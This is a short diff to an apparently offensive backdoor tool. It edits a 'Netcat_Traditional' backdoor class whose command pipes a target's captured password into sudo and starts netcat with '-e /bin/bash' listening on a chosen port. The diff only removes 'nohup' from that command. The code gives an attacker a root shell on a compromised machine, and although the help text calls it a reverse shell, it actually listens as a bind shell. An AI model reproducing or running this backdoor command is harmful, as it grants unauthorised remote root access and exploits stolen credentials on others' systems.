@@ -15,7 +15,7 @@ class Netcat_Traditional(Backdoor):
         self.help_text = INFO + "Utilizes netcat's traditional -e option to create a reverse shell." 
 
     def get_command(self):
-        return "echo " + self.core.curtarget.pword + " | sudo -S nohup ./nc.traditional -l -p %s -e /bin/bash" % self.get_value("port")
+        return "echo " + self.core.curtarget.pword + " | sudo -S nc.traditional -l -p %s -e /bin/bash" % self.get_value("port")
 
     def do_exploit(self, args):
         target = self.core.curtarget
